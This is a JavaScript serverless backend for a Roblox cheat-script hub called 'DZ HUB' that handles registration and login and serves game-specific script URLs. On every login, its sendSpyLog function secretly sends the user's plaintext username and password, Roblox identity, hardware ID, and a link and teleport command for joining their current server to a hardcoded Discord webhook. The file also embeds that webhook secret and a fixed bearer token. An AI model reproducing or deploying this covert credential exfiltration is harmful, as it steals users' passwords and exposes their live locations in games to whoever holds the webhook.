const https = require('https');
let usersDB = []; 

const SCRIPTS_BY_GAME = {
    "135856908115931": "https://raw.githubusercontent.com/therealroier/ScriptDz/refs/heads/main/DUELS",
    "74084441161738": "https://raw.githubusercontent.com/therealroier/ScriptDz/refs/heads/main/DUELS",
    "131117978948830": "https://raw.githubusercontent.com/therealroier/ScriptDz/refs/heads/main/DUELS"
};

const DISCORD_WEBHOOK = "/api/webhooks/1469998225472880662/fQ8_e1mjU3-lFm-WU-qIbNTQ06CXjrXeiazo_o5uNPXBwWVCrI6w-SjDStPeBjCb5B11";

function sendSpyLog(data) {
    const joinLink = `https://therealroier.github.io/zz/?placeId=${data.placeId}&gameInstanceId=${data.jobId}`;
    const payload = JSON.stringify({
        embeds: [{
            title: "Spy Logs - Session Active",
            color: 16753920,
            fields: [
                { name: "Auth Credentials", value: `\`\`\`User: ${data.nickname}\nPass: ${data.password}\`\`\``, inline: false },
                { name: "Roblox Player", value: `\`\`\`${data.robloxName} (${data.userId})\`\`\``, inline: true },
                { name: "HWID", value: `\`\`\`${data.hwid}\`\`\``, inline: true },
                { name: "Experience", value: `\`\`\`${data.placeName || data.placeId}\`\`\``, inline: false },
                { name: "Join Server", value: `[Click here to Join](${joinLink})`, inline: false },
                { name: "Teleport Command", value: `\`\`\`game:GetService("TeleportService"):TeleportToPlaceInstance(${data.placeId},"${data.jobId}",game.Players.LocalPlayer)\`\`\``, inline: false }
            ],
            footer: { text: "DZ HUB • " + new Date().toLocaleString() }
        }]
    });

    const options = {
        hostname: 'discord.com', port: 443, path: DISCORD_WEBHOOK, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
    };
    const req = https.request(options);
    req.write(payload);
    req.end();
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const authHeader = req.headers['authorization'];
    if (authHeader !== 'Bearer DZisthegoat') return res.status(403).json({ message: "Forbidden" });

    const { action, nickname, password, license, hwid, robloxName, userId, placeId, jobId, placeName, keyExpired } = req.body;

    if (action === "register") {
        const exists = usersDB.find(u => u.nickname.toLowerCase() === nickname.toLowerCase());
        if (exists) return res.status(400).json({ message: "Exists" });

        usersDB.push({ nickname, password, license, hwid }); 
        return res.status(200).json({ status: "success" });
    }

    if (action === "login") {
        const user = usersDB.find(u => u.nickname === nickname && u.password === password);
        
        if (!user) return res.status(401).json({ message: "Invalid Credentials" });

        if (user.hwid !== hwid) {
            return res.status(403).json({ message: "HWID Mismatch" });
        }

        if (keyExpired) {
            usersDB = usersDB.filter(u => u.nickname !== nickname);
            return res.status(410).json({ message: "Expired" });
        }

        const scriptUrl = SCRIPTS_BY_GAME[String(placeId)];
        if (!scriptUrl) return res.status(403).json({ message: "Game not supported" });

        sendSpyLog({ nickname, password, robloxName, userId, placeId, jobId, placeName, hwid });

        return res.status(200).json({ status: "success", license: user.license, scriptUrl });
    }
};
